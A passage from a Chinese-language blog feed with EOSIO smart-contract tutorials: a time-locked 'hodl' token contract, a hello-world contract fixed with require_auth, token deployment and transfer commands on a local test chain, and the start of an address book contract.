hodler, name to, eosio::asset quantity, std::string memo)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;检查不能转给自己</span><br><span class="line">  if (to !&#x3D; get_self() || hodler &#x3D;&#x3D; get_self())</span><br><span class="line">  &#123;</span><br><span class="line">    print(&quot;These are not the droids you are looking for.&quot;);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;&#x2F;检查提款时间未过去</span><br><span class="line">  check(now() &lt; the_party, &quot;You&#39;re way late&quot;);</span><br><span class="line">&#x2F;&#x2F;转账数量大于0</span><br><span class="line">  check(quantity.amount &gt; 0, &quot;When pigs fly&quot;);</span><br><span class="line">&#x2F;&#x2F;转账的token使用的是构造函数中指定的SYS</span><br><span class="line">  check(quantity.symbol &#x3D;&#x3D; hodl_symbol, &quot;These are not the droids you are looking for.&quot;);</span><br><span class="line">&#x2F;&#x2F;更新余额</span><br><span class="line">  balance_table balance(get_self(), hodler.value);</span><br><span class="line">  auto hodl_it &#x3D; balance.find(hodl_symbol.raw());</span><br><span class="line"></span><br><span class="line">  if (hodl_it !&#x3D; balance.end())</span><br><span class="line">    balance.modify(hodl_it, get_self(), [&amp;](auto &amp;row) &#123;</span><br><span class="line">      row.funds +&#x3D; quantity;</span><br><span class="line">    &#125;);</span><br><span class="line">  else</span><br><span class="line">    balance.emplace(get_self(), [&amp;](auto &amp;row) &#123;</span><br><span class="line">      row.funds &#x3D; quantity;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意开头的on_notify属性，它是EOSIO.CDT属性之一。用于对action进行注释。确保仅当通知来自于eosio.token合约的transfer操作时，传入的通知才转发到存款操作。eosio.token合约会在转移通知到达hodl的deposit操作之前检查发送者是否有足够的token。</p><h2 id="提款"><a href="#提款" class="headerlink" title="提款"></a>提款</h2><p>token存到hodl合约后，需要提款到账户。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[[eosio::action]]</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">party</span><span class="params">(name hodler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//Check the authority of hodler</span></span><br><span class="line">  require_auth(hodler);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//Check the current time has passed the the_party time</span></span><br><span class="line">  check(now() &gt; the_party, <span class="string">"Hold your horses"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="function">balance_table <span class="title">balance</span><span class="params">(get_self(), hodler.value)</span></span>;</span><br><span class="line">  <span class="keyword">auto</span> hodl_it = balance.find(hodl_symbol.raw());</span><br><span class="line"></span><br><span class="line">  <span class="comment">//Make sure the holder is in the table</span></span><br><span class="line">  check(hodl_it != balance.end(), <span class="string">"You're not allowed to party"</span>);</span><br><span class="line"></span><br><span class="line">  action&#123;</span><br><span class="line">    permission_level&#123;get_self(), <span class="string">"active"</span>_n&#125;,</span><br><span class="line">    <span class="string">"eosio.token"</span>_n,</span><br><span class="line">    <span class="string">"transfer"</span>_n,</span><br><span class="line">    <span class="built_in">std</span>::make_tuple(get_self(), hodler, hodl_it-&gt;funds, <span class="built_in">std</span>::<span class="built_in">string</span>(<span class="string">"Party! Your hodl is free."</span>))</span><br><span class="line">  &#125;.send();</span><br><span class="line"></span><br><span class="line">  balance.erase(hodl_it);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>检查提款账户是最初进行存款的账户。</li><li>找到锁定的余额。</li><li>将token从hodl转到账户。</li></ol><h2 id="完整合约"><a href="#完整合约" class="headerlink" title="完整合约"></a>完整合约</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;eosio/eosio.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;eosio/print.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;eosio/asset.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;eosio/system.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> eosio;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> [[<span class="title">eosio</span>:</span>:contract(<span class="string">"hodl"</span>)]] hodl : <span class="keyword">public</span> eosio::contract &#123;</span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">uint32_t</span> the_party = <span class="number">1645525342</span>;</span><br><span class="line">    <span class="keyword">const</span> symbol hodl_symbol;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> [[<span class="title">eosio</span>:</span>:table]] balance</span><br><span class="line">    &#123;</span><br><span class="line">      eosio::asset funds;</span><br><span class="line">      <span class="keyword">uint64_t</span> primary_key() <span class="keyword">const</span> &#123; <span class="keyword">return</span> funds.symbol.raw(); &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">using</span> balance_table = eosio::multi_index&lt;<span class="string">"balance"</span>_n, balance&gt;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> now() &#123;</span><br><span class="line">      <span class="keyword">return</span> current_time_point().sec_since_epoch();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">using</span> contract::contract;</span><br><span class="line"></span><br><span class="line">    hodl(name receiver, name code, datastream&lt;<span class="keyword">const</span> <span class="keyword">char</span> *&gt; ds) : contract(receiver, code, ds),hodl_symbol(<span class="string">"SYS"</span>, <span class="number">4</span>)&#123;&#125;</span><br><span class="line"></span><br><span class="line">    [[eosio::on_notify(<span class="string">"eosio.token::transfer"</span>)]]</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deposit</span><span class="params">(name hodler, name to, eosio::asset quantity, <span class="built_in">std</span>::<span class="built_in">string</span> memo)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (hodler == get_self() || to != get_self())</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      check(now() &lt; the_party, <span class="string">"You're way late"</span>);</span><br><span class="line">      check(quantity.amount &gt; <span class="number">0</span>, <span class="string">"When pigs fly"</span>);</span><br><span class="line">      check(quantity.symbol == hodl_symbol, <span class="string">"These are not the droids you are looking for."</span>);</span><br><span class="line"></span><br><span class="line">      <span class="function">balance_table <span class="title">balance</span><span class="params">(get_self(), hodler.value)</span></span>;</span><br><span class="line">      <span class="keyword">auto</span> hodl_it = balance.find(hodl_symbol.raw());</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (hodl_it != balance.end())</span><br><span class="line">        balance.modify(hodl_it, get_self(), [&amp;](<span class="keyword">auto</span> &amp;row) &#123;</span><br><span class="line">          row.funds += quantity;</span><br><span class="line">        &#125;);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        balance.emplace(get_self(), [&amp;](<span class="keyword">auto</span> &amp;row) &#123;</span><br><span class="line">          row.funds = quantity;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [[eosio::action]]</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">party</span><span class="params">(name hodler)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="comment">//Check the authority of hodlder</span></span><br><span class="line">      require_auth(hodler);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// //Check the current time has pass the the party time</span></span><br><span class="line">      check(now() &gt; the_party, <span class="string">"Hold your horses"</span>);</span><br><span class="line"></span><br><span class="line">      <span class="function">balance_table <span class="title">balance</span><span class="params">(get_self(), hodler.value)</span></span>;</span><br><span class="line">      <span class="keyword">auto</span> hodl_it = balance.find(hodl_symbol.raw());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// //Make sure the holder is in the table</span></span><br><span class="line">      check(hodl_it != balance.end(), <span class="string">"You're not allowed to party"</span>);</span><br><span class="line"></span><br><span class="line">      action&#123;</span><br><span class="line">        permission_level&#123;get_self(), <span class="string">"active"</span>_n&#125;,</span><br><span class="line">        <span class="string">"eosio.token"</span>_n,</span><br><span class="line">        <span class="string">"transfer"</span>_n,</span><br><span class="line">        <span class="built_in">std</span>::make_tuple(get_self(), hodler, hodl_it-&gt;funds, <span class="built_in">std</span>::<span class="built_in">string</span>(<span class="string">"Party! Your hodl is free."</span>))</span><br><span class="line">      &#125;.send();</span><br><span class="line"></span><br><span class="line">      balance.erase(hodl_it);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="测试-4"><a href="#测试-4" class="headerlink" title="测试"></a>测试</h2><p>创建一个账户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos create account eosio hodl EOS8STYz9TYuEDHS1fErjgaDR1ApTk62eEaBzC7Jhn486paNrgsZC</span><br></pre></td></tr></table></figure><p>部署合约到该账户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eosio-cpp hodl.cpp -o hodl.wasm</span><br><span class="line">cleos set contract hodl ./ -p hodl@active</span><br></pre></td></tr></table></figure><p>需要eosio.code权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos set account permission hodl active --add-code</span><br></pre></td></tr></table></figure><p>创建一个测试账户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos create account eosio han EOS8STYz9TYuEDHS1fErjgaDR1ApTk62eEaBzC7Jhn486paNrgsZC</span><br></pre></td></tr></table></figure><p>将之前发布的SYStoken转移到han账户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action eosio.token transfer '[ "alice", "han", "100.0000 SYS", "Slecht geld verdrijft goed" ]' -p alice@active</span><br></pre></td></tr></table></figure><p>将一些token从han账户转移到hodl合约</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos transfer han hodl '0.0001 SYS' 'Hodl!' -p han@active</span><br></pre></td></tr></table></figure><p>为了测试提款功能，需要更新the_party变量，将它更新到过去的某个时间点。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONTRACT hodl : <span class="keyword">public</span> eosio::contract &#123;</span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 9 June 2018 01:00:00</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">uint32_t</span> the_party = <span class="number">1528549200</span>;</span><br></pre></td></tr></table></figure><p>修改the_party值, 然后重新部署运行就行。测试提款：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action hodl party &#39;[&quot;han&quot;]&#39; -p han@active</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;上一篇讲到了对合约创建表，修改和删除表中记录。本次则显示如何持久存储合约使用的数据以及创建许多索引来访问该数据。&lt;/p&gt;
    
    </summary>
    
    
      <category term="BlockChain" scheme="https://ggyggy666.github.io/categories/BlockChain/"/>
    
    
      <category term="区块链安全之EOS学习（三）" scheme="https://ggyggy666.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOS%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>区块链安全之EOS学习（二）</title>
    <link href="https://ggyggy666.github.io/2021/03/17/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOS%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://ggyggy666.github.io/2021/03/17/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOS%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-03-17T07:32:12.000Z</published>
    <updated>2021-03-17T14:33:28.458Z</updated>
    
    <content type="html"><![CDATA[<p>进入智能合约部分。</p><a id="more"></a><h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><p>首先创建一个HelloWorld智能合约，然后编译，部署到区块链上运行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;xxx&#x2F;contracts&#x2F;&#x2F;先进入到之前创建的contracts目录</span><br><span class="line">mkdir hello&#x2F;&#x2F;创建hello目录</span><br><span class="line">cd hello</span><br><span class="line">vim hello.cpp</span><br></pre></td></tr></table></figure><h2 id="编写智能合约"><a href="#编写智能合约" class="headerlink" title="编写智能合约"></a>编写智能合约</h2><p>创建并打开hello.cpp后，就可以输入智能合约了。由于使用的是C++11标准写的，可能看起来不是太能懂。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;eosio/eosio.hpp&gt;//导入头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> eosio;<span class="comment">//使用eosio命名空间，之后可直接使用print</span></span><br><span class="line"></span><br><span class="line">#添加公共访问说明符</span><br><span class="line"><span class="class"><span class="keyword">class</span> [[<span class="title">eosio</span>:</span>:contract]] hello : <span class="keyword">public</span> contract &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">      <span class="keyword">using</span> contract::contract;<span class="comment">//使用说明</span></span><br><span class="line"></span><br><span class="line">      [[eosio::action]]<span class="comment">//为了给hi函数添加action属性，否则ABI生成器无法产生可靠输出。</span></span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">hi</span><span class="params">( name user )</span> </span>&#123;</span><br><span class="line">         print( <span class="string">"Hello, "</span>, user);<span class="comment">//这个print是eosio定义的函数</span></span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="编译-部署"><a href="#编译-部署" class="headerlink" title="编译/部署"></a>编译/部署</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eosio-cpp hello.cpp -o hello.wasm</span><br></pre></td></tr></table></figure><p>将cpp编译为wasm文件。</p><p>部署合约时需要部署到一个账户上，使其成为合约的接口。因此先创建一个hello账户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos create account eosio hello EOS8STYz9TYuEDHS1fErjgaDR1ApTk62eEaBzC7Jhn486paNrgsZC -p eosio@active</span><br></pre></td></tr></table></figure><p>指定合约所在目录的绝对路径，将合约部署到区块链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos set contract hello &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;hello -p hello@active</span><br></pre></td></tr></table></figure><h2 id="与合约交互"><a href="#与合约交互" class="headerlink" title="与合约交互"></a>与合约交互</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action hello hi &#39;[&quot;bob&quot;]&#39; -p bob@active</span><br></pre></td></tr></table></figure><p>使用push将输入传给合约hello的hi函数执行，即’[“bob”]’就是传进去的参数，后面的bob@active是发起这个动作的账户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action hello hi &#39;[&quot;bob&quot;]&#39; -p alice@active</span><br></pre></td></tr></table></figure><p>alice传bob值进去。这是因为合约没有绑定当前执行这个合约的账户与传进来的user值一致，导致任何账户都可以向任何用户say hello。因此必须要将执行合约的用户与hi中的user相同。在print函数之前加上一个验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require_auth(user);</span><br></pre></td></tr></table></figure><p>修改了合约，需要重新编译和部署：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eosio-cpp -abigen -o hello.wasm hello.cpp</span><br><span class="line">cleos set contract hello &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;hello -p hello@active</span><br></pre></td></tr></table></figure><p>再次尝试使用alice账户传bob，报错了。使用alice账户传alice，成功。</p><h1 id="部署token"><a href="#部署token" class="headerlink" title="部署token"></a>部署token</h1><p>token就是用来交易的货币，EOS中称为：eosio.token。</p><h2 id="获得合约"><a href="#获得合约" class="headerlink" title="获得合约"></a>获得合约</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd xxx&#x2F;contracts</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;EOSIO&#x2F;eosio.contracts --branch v1.7.0 --single-branch</span><br><span class="line">cd eosio.contracts&#x2F;contracts&#x2F;eosio.token</span><br></pre></td></tr></table></figure><p>github下得太慢，可以先转到gitee下。</p><h2 id="部署合约"><a href="#部署合约" class="headerlink" title="部署合约"></a>部署合约</h2><p>首先得创建token账户,解锁钱包后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos create account eosio eosio.token EOS6MRyAjQq8ud7hVNYcfnVPJqcVpscN5So8BhtHuGYqET5GDW5CV</span><br></pre></td></tr></table></figure><p>编制合约</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eosio-cpp -I include -o eosio.token.wasm src&#x2F;eosio.token.cpp --abigen</span><br></pre></td></tr></table></figure><p>部署token合约</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos set contract eosio.token &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;eosio.contracts&#x2F;contracts&#x2F;eosio.token --abi eosio.token.abi -p eosio.token@active</span><br></pre></td></tr></table></figure><h2 id="创建令牌"><a href="#创建令牌" class="headerlink" title="创建令牌"></a>创建令牌</h2><p>创建令牌，需要确定发行者的账户比如Alice，需要设置资产数量，比如1.000SYS，浮点数代表最大供给量，大写字母SYS表示资产。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action eosio.token create &#39;[ &quot;alice&quot;, &quot;1000000000.0000 SYS&quot;]&#39; -p eosio.token@active</span><br></pre></td></tr></table></figure><p>-p 后指定的账户表面已经过这个token账户授权。还有另一种方法:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action eosio.token create '&#123;"issuer":"alice", "maximum_supply":"1000000000.0000 SYS"&#125;' -p eosio.token@active</span><br></pre></td></tr></table></figure><h2 id="发行令牌"><a href="#发行令牌" class="headerlink" title="发行令牌"></a>发行令牌</h2><p>上面已经指定Alice是发行人了，只能它发行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action eosio.token issue &#39;[&quot;alice&quot;, &quot;100.0000 SYS&quot;, &quot;memo&quot;]&#39; -p alice@active</span><br></pre></td></tr></table></figure><p>这个要求通知资金的发送者和接收者，可以使用-d -j指示“不要广播”和”将事务返回json”。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action eosio.token issue &#39;[&quot;alice&quot;, &quot;100.0000 SYS&quot;, &quot;memo&quot;]&#39; -p alice@active -d -j</span><br></pre></td></tr></table></figure><h2 id="转移令牌"><a href="#转移令牌" class="headerlink" title="转移令牌"></a>转移令牌</h2><p>一个账户向另一个账户转钱</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action eosio.token transfer &#39;[&quot;alice&quot;, &quot;bob&quot;, &quot;25.0000 SYS&quot;, &quot;m&quot;]&#39; -p alice@active</span><br></pre></td></tr></table></figure><p>alice向bob转了25</p><p>检查bob是否接收到了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos get currency balance eosio.token bob SYS</span><br></pre></td></tr></table></figure><p>查看Alice的余额</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos get currency balance eosio.token alice SYS</span><br></pre></td></tr></table></figure><h1 id="ABI文件"><a href="#ABI文件" class="headerlink" title="ABI文件"></a>ABI文件</h1><p>看指导书吧</p><p><a href="https://developers.eos.io/welcome/latest/smart-contract-guides/understanding-ABI-files" target="_blank" rel="noopener">https://developers.eos.io/welcome/latest/smart-contract-guides/understanding-ABI-files</a></p><h1 id="数据持久性"><a href="#数据持久性" class="headerlink" title="数据持久性"></a>数据持久性</h1><p>持久保存智能合约的使用，不被无关的业务逻辑分散。实质就是配置表，实例化表，创建新记录，修改记录和删除记录。</p><h2 id="创建地址簿智能合约"><a href="#创建地址簿智能合约" class="headerlink" title="创建地址簿智能合约"></a>创建地址簿智能合约</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts</span><br></pre></td></tr></table></figure><p>切换回contracts目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir addressbook</span><br><span class="line">cd addressbook</span><br><span class="line">vim addressbook.cpp</span><br></pre></td></tr></table></figure><p>新建文件打开后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;eosio&#x2F;eosio.hpp&gt;</span><br><span class="line"></span><br><span class="line">using namespace eosio;</span><br><span class="line"></span><br><span class="line">class [[eosio::contract(&quot;addressbook&quot;)]] addressbook : public eosio::contract&#123;</span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上是按照之前那样的C++11标准编写的框架。下面来完善它。</p><h2 id="为地址簿创建数据结构"><a href="#为地址簿创建数据结构" class="headerlink" title="为地址簿创建数据结构"></a>为地址簿创建数据结构</h2><p>这是一个通讯录，对象肯定是人，因此需要创建一个人的结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct person&#123;</span><br><span class="line">name key;&#x2F;&#x2F;用户的key,name类型的，唯一。</span><br><span class="line">std::string first_name;</span><br><span class="line">std::string last_name;</span><br><span class="line">std::string street;</span><br><span class="line">std::string city;</span><br><span class="line">std::string state;</span><br><span class="line"></span><br><span class="line">uint64_t primary_key() const &#123;return key.value&#125;;&#x2F;&#x2F;为了让之后的multi_index可以根据key得到value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="配置多索引表"><a href="#配置多索引表" class="headerlink" title="配置多索引表"></a>配置多索引表</h2><p>使用前面的struct配置表。该表的eosio::multi_index需要命名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">using address_index &#x3D; eosio::multi_index&lt;&quot;people&quot;_n, person&gt;</span><br></pre></td></tr></table></figure><p>通过multi_index的配置，有了一个people的表。</p><ul><li><p>使用_n定义eosio::name类型，使用该类型命名表为people。</p></li><li><p>传递person给之前的person结构。</p></li><li><p>声明了此表的类型，之后用来实例化这个表。</p></li></ul><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>合约第一个公共方法应该是构造函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addressbook(name receiver, name code, datastream&lt;const char*&gt; ds):contract(receiver, code, ds)&#123;&#125;</span><br></pre></td></tr></table></figure><p>code是将合约部署到区块链的账户。</p><h2 id="向表中添加记录"><a href="#向表中添加记录" class="headerlink" title="向表中添加记录"></a>向表中添加记录</h2><p>先前定义了多索引表的primary_key，是为了强制每个账户只能存储一个记录。设计规则：</p><ul><li>能修改地址簿的唯一账户只能是用户自身。</li><li>表的primary_key唯一。</li><li>可以创建和修改表的记录。</li></ul><p>而person结构中，name类似的key也是唯一的，因此它可成为primary_key（uint64_t 整数）。而条件一的满足只需要require即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void upsert(</span><br><span class="line">name user,</span><br><span class="line">std::string first_name,</span><br><span class="line">std::string last_name,</span><br><span class="line">    std::string street,</span><br><span class="line">    std::string city,</span><br><span class="line">    std::string state</span><br><span class="line">)&#123;</span><br><span class="line">require_auth(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="实例化表"><a href="#实例化表" class="headerlink" title="实例化表"></a>实例化表</h3><p>可以看到要实例化表，需要两个参数：</p><ul><li>code：由于修改，删除记录都是只能自身合约账户来操作，因此参数值应该是：get_self(), 即合约名字。</li><li>scope: 直接使用部署该合约的账户，即：get_first_receiver()。</li></ul><p>因此，增加代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address_index addresses(get_self(), 